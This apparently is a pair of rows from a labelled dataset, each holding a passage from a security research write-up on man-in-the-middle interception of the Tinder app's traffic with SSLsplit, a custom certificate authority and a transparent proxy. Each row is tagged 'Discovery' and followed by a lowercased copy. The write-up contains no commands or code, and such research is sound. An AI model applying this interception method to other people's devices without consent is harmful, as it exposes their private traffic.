Finally we settled on an implementation using SSLsplit4. This allowed us to use our own certificate authority to generate proper SSL certificates for any endpoint connected to during our tests. By importing this authority we were able to run the Tinder application while logging all traffic to plaintext files for later inspection. However for a casual attacker this would be highly impractical as we had to manually install the certificate authority and accept severe warnings to get it to work. ,Discovery,finally we settled on an implementation using sslsplit4 this allowed us to use our own certificate authority to generate proper ssl certificates for any endpoint connected to during our tests by importing this authority we were able to run the tinder application while logging all traffic to plaintext files for later inspection however for a casual attacker this would be highly impractical as we had to manually install the certificate authority and accept severe warnings to get it to work

 To complete our MitM setup we needed to proxy HTTP(S) requests and fake certificates for the various requested web resources. Because we wanted to analyze all requests we chose to set our proxy in transparent setup as opposed to defining the proxy in the WiFi settings. Reason for this is that applications on Android don't use the proxy as configured in the WiFi settings. As such we required a proxy which could generate SSL certificates for the various end-points requested by the application. ,Discovery,to complete our mitm setup we needed to proxy https requests and fake certificates for the various requested web resources because we wanted to analyze all requests we chose to set our proxy in transparent setup as opposed to defining the proxy in the wifi settings reason for this is that applications on android dont use the proxy as configured in the wifi settings as such we required a proxy which could generate ssl certificates for the various endpoints requested by the application
